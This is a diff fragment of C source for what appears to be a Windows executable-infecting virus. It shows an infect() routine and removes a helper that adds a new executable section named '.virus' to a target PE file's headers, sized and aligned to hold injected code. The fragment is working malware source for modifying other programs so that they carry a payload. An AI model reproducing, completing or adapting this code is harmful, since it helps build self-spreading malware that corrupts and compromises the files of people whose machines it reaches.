@@ -9,7 +9,6 @@ typedef struct {
 
 static int open_file_view(const char* filename, file_view_t* fileView, data_t* data);
 static void close_file_view(file_view_t* fileView, data_t* data);
-static void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data);
 
 int infect(const char* filename, data_t* data) {
   file_view_t fileView;
@@ -65,23 +64,6 @@ int infect(const char* filename, data_t* data) {
   close_file_view(&fileView, data);
 
   return 0;
-}
-
-static void create_section_header(IMAGE_SECTION_HEADER* sectionHeader, IMAGE_NT_HEADERS* ntHeaders, data_t* data) {
-  ntHeaders->FileHeader.NumberOfSections++;
-
-  sectionHeader->Name[0] = '.';
-  sectionHeader->Name[1] = 'v';
-  sectionHeader->Name[2] = 'i';
-  sectionHeader->Name[3] = 'r';
-  sectionHeader->Name[4] = 'u';
-  sectionHeader->Name[5] = 's';
-
-  sectionHeader->Misc.VirtualSize = data->codeSize;
-  sectionHeader->VirtualAddress = (sectionHeader - 1)->VirtualAddress + align_value((sectionHeader - 1)->Misc.VirtualSize, ntHeaders->OptionalHeader.SectionAlignment);
-  sectionHeader->SizeOfRawData = align_value(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
-  sectionHeader->PointerToRawData = (sectionHeader - 1)->PointerToRawData + align_value((sectionHeader - 1)->SizeOfRawData, ntHeaders->OptionalHeader.FileAlignment);
-  sectionHeader->Characteristics = IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ;
 }
 
 static int open_file_view(const char* filename, file_view_t* fileView, data_t* data) {
